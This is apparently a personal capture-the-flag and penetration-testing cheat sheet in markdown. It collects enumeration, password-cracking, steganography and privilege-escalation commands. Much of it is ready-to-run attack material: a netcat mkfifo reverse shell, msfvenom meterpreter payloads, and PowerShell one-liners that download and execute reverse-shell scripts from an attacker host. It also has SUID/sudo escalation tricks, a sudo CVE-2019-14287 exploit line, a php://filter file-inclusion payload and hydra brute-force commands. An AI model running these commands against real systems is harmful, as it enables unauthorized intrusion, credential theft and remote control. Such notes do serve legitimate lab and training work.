## jooma
```
apt-get install joomscan
```

## process monitoring
```
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x ./pspy64
./pspy64

```

## Finding SUID/SGID etc
```
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm +6000 2>/dev/null | grep '/bin/'

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## find has SUID
```
find . -exec touch test.txt \;
find . -exec chmod -R 777 /root \;
```

## subdomain
```
wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt
```

## Create Salt Passwd
```
openssl passwd -1 -salt [salt] [password]

salt:new passwd:123

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

## php
```
filter
http://xxx/index.php?m=php://filter/convert.base64-encode/resource=index

```

## subdomain
```
https://dnsdumpster.com/

https://github.com/aboul3la/Sublist3r.git
pip3 install -r requirements.txt
pip3
python3 sublist3r.py -d target -o sub-output.txt
```

## grep
```
grep -R .
```

## fix file
```
https://www.garykessler.net/library/file_sigs.html
hexeditor
```

## show socket
```
ss -tulpn 
```

# binwalk
```
binwalk target
binwalk -e target
binwalk --dd '.*' target

if file size 0, it may need zip crack

7za e
```

# smb
```
enum
smbmap -H target

smbclient //ip/anonymous
 ls
 cd
 get
```

# ssh
```
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ /usr/sbin/john --wordlist=/root/Desktop/dict/rockyou.txt id_rsa.hash

tonnel
ssh -L 10000:localhost:10000 <username>@<ip>
```
## openSSL
```
generate prikey
openssl genrsa -aes256 -out private.key 8912

generate pubkey
openssl rsa -in private.key -pubout -out public.key

encrypt
openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt

decrypt
openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt
```

## pgp
```
encrypt
gpg -c data.txt

decrypt
gpg -d data.txt.gpg

password hash crack
gpg2john private.asc >hash
john hash
gpg --import private.asc
gpg --decrypt backup.pgp
```

## scp
```
remote to local
 scp username@remote.example.com:/remote/directory/a.txt /local/directory
 
 scp /local/test.txt user@remoteHost:/home/user/tmp/
```

## image fix
```
hxeditor
```


## zip escalate
```
sudo zip filename.zip filename.txt -T --unzip-command="sh -c /bin/bash"
```
## export
```
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```


## sudo enum
```
sudo -l
```

## vi escalation
```
:!sh
```

## namp
```
allport scan
nmap -vv -sV -p- --script vuln TARGETIP

smb-enum
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>

nmap -sT -p port-number -O -sC -sV -T[1-5] -oA output-file-name ip-address

```

## dirb
```
dirb TARGETURL WORDLIST 
ex :dirb http://hogehoge /usr/share/wordlist/dirbuster/xxxxx.txt
```
## zips
```
tar.gz
-zip
tar -zcvf xxxx.tar.gz directory
-unzip
tar -zxvf xxxx.tar.gz

gz
-unzip
gunzip target

```

## hashcat
```

hashcat -m 0 hases.txt /usr/share/wordlists/rockyou.txt --force

```

## hashidentifier
```
hash-identifier
```

## John
- hash
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```


## hydra bruteforce
```
hydra -l bob -P WORDLIST -t 1 -f HOSTNAME http-get /DIR/
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.2.215 http-get /protected/

hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V
```
## nikto
```
nikto -h host:port

```

## ssl
```
openssl enc -in encrypted.txt -out binarytext -d -a && openssl rsautl -decrypt -in binarytext -out decrepted.txt -inkey encrypted.key && cat decrepted.txt
```

# gather linux
```
enum4linux [options] ip"
```


## steg
```
for jpeg
sudo apt install steghide -y
steghide extract -sf ./<file to extract>.jpg

for png
gem install zsteg
zsteg file

for all
apt-get install python3-pip -y
pip3 install stegoveritas 
stegoveritas_install_deps

stegoveritas -steghide file
stegoveritas -exif　file

```

## zip crack
```
./zip2john name.zip > hash.txt
./john hash.txt


fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt ./file.zip
```


## enum FTPs
```
FTP 
ftp ip-address
anonymous/anonymous

NFS
showmount -e ip-address
mount ip:/file/path /local/file/path

```

## tty
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## hash
```
md5sum data.txt
```
## aws
```
curl advent-bucket-one.s3.amazonaws.com | xmllint --format -
```

## reverse
```
r2 -d file-name

aaa
afl
pdf @main

//info
izz


//breakpoint
db address

//debug
dc
//move next
ds
//list register
dr 
//show memory
px @rbp-04x

cmpl var_8h, %eax
jge 0x5576866b6629
%eax >= var_8h

gdb
disas main
```

## reverse shell
```
nc -lvnp 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f

```

## knock
```
https://github.com/grongor/knock
knock <ip> 7000 8000 9000 7000 8000 9000 8888 && nmap <ip>
knock <ip> 7000 8000 9000 7000 8000 9000 && telnet <ip> 8888

```

##windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local> LPORT=1111 -f exe -o reverse.exe

python -m SimpleHTTPServer 90
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<local>:90/reverse.exe','reverse.exe')"

msfconsole
set payload windows/meterpreter/reverse_tcp
set LHOST <local>
set LPORT 1111

reverse.exe
```


## CVE

```
CVE-2019-14287
bdefore: sudo 1.8.28
sudo -V
<user> ALL=(ALL:!root) NOPASSWD: ALL
sudo -u#-1 command

CVE-2019-18634
https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c

heartbleed
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOST
set verbose true
run

```

## windows
```
https://github.com/samratashok/nishang
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
python3 -m http.server
nc -lnvp 1234

powershell iex (New-Object Net.WebClient).DownloadString('http://ip:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ip -Port 1234


msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.31.164 LPORT=9000 -f exe -o re.exe


powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.31.164:8000/re.exe','re.exe')"

msfconsole
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.31.164 
set LPORT 9000
run

Start-Process "re.exe"

whoami /priv

juicy priv
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
```

## TIPS
```
cat .bash_history

find foo -exec whoami \;

//banner
/etc/update-motd.d/

space
${IFS}
```

## useful links
GTFOBins  : unix binaries list
- https://gtfobins.github.io/#


Metasploit
- reverse_tcp payload
  - https://netsec.ws/?p=331

- meterpreter basis
  - https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

hash
- hash identifier
  - https://www.tunnelsup.com/hash-analyzer/
 - hash resolver
  - https://crackstation.net/
  
 Enum
 - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
